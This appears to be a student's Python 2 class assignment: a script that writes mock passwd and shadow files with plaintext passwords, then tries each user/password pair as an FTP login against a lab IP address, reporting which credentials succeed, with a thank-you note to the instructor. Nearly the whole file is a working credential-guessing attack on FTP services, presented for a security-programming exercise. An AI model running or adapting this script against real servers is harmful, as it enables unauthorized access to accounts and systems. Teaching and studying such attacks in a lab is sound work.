import ftplib
import sys

def bruteLogin(hostname, passwordFile, shadowFile):
    """
    Try brute force logins 
    """
    try:
        pF = open(passwordFile, 'r')
    except Exception, e:
        print '[-] Unable to open file: ' + passwordFile + '\n[-] Make sure you are targeting the appropriate file.'
        sys.exit(1)
    for line in pF.readlines():
        lineSplit = line.split(':')
        userName = lineSplit[0] 
        fullName = lineSplit[4].strip('\r').strip('\n') 
        
        try:
            sF = open(shadowFile, 'r')
        except Exception, e:
            print '[-] Unable to open file: ' + shadowFile + '\n[-] Make sure you are targeting the appropriate file.'
            sys.exit(1)

        for shadow in sF.readlines():
            shadowSplit = shadow.split(':')
            if shadowSplit[0] == userName:
                print '\n[+] Password found for: ' + fullName
                passWord = shadowSplit[1].strip('\r').strip('\n') 
                sF.close()
                break
            else:
                passWord = ''
        sF.close() 
        if passWord != '':
            print '[+] Trying: '+userName + '/' + passWord 
            try:
                ftp = ftplib.FTP(hostname) 
                ftp.login(userName, passWord) 
                print '[+] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + '/' + passWord + '/' + fullName
                ftp.quit() 
                print '\n[+] Successfully brute forced FTP with ' + fullName + "'s credentials: " + userName + '/' + passWord

                print '\n[!] Janet, thank you for all of the instruction and guidance that you gave to me in this class.  I have very much enjoyed learning python and exploring everything that it is capable of doing.  I have begun to seriously rethink my career and future because of this.  Good luck in your future!!'
                pF.close()
                return (userName, passWord)
            except Exception, e: 
                print '[-] ' + str(hostname) + ' FTP Logon Not Successful: ' + userName + '/' + passWord + '/' + fullName
        else:
             print '\n[-] Skipping ' + userName + ' because no password was matched.'  
    pF.close()
    print '\n[-] Could not brute force FTP credentials.'
    print '\n[!] Janet, thank you for all of the instruction and guidance that you gave to me in this class.  I have very much enjoyed learning python and exploring everything that it is capable of doing.  I have begun to seriously rethink my career and future because of this.  Good luck in your future!!'
    return (None, None) 
    
"""
Create a password file and write user names and full names to it
Create a shadow file and write the user names and passwords to it
Print out the files that were created
Call the bruteLogin() method
"""
passwordFile = open('userPassword.txt', 'w')
passwordFile.write("smithj:py:1001:1001:John Smith:/home/smithj:/bin/bash\n")
passwordFile.write("dmartin:ddsa:1001:1001:John Smith:/home/dmartin:/bin/bash\n")
passwordFile.write("willinksJ:x:1001:1001:Jocko Willinks:/home/willinksJ:/bin/bash\n") 
passwordFile.write("ddoe:x:1001:1001:Dolly Doe:/home/ddoe:/bin/bash\n") 
passwordFile.write("jascheri:x:1001:1001:Jeremy Ascheri:/home/jascheri:/bin/bash\n")
passwordFile.close()
    
shadowFile = open('userShadow.txt', 'w')
shadowFile.write("smithj:KJDKKkkLLjjwlnttqoiybnm.:10063:0:99999:7:::\n")
shadowFile.write("willinksJ:jarheadelite!:10063:0:99999:7:::\n")
shadowFile.write("ddoe:d12345password:10063:0:99999:7:::\n") 
shadowFile.write("jascheri:Jpr4d#sc_8d2!@:10063:0:99999:7:::\n") 
shadowFile.close()

"""
Sets the host IP and executes the function
"""
host = '192.168.95.179' 

bruteLogin(host,'userPassword.txt', 'userShadow.txt' )

